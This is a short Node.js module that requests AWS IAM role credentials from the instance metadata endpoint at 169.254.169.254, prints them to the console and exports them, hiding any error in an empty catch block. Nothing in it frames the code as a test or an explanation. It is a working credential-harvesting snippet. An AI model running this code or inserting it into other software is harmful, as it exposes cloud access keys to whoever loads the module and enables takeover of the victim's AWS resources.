const request = require("sync-request")
let result

try {
  result = request("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-full-access-s3-feeco-created-role")
  console.log(result.getBody())
} catch (e) {}

module.exports = result
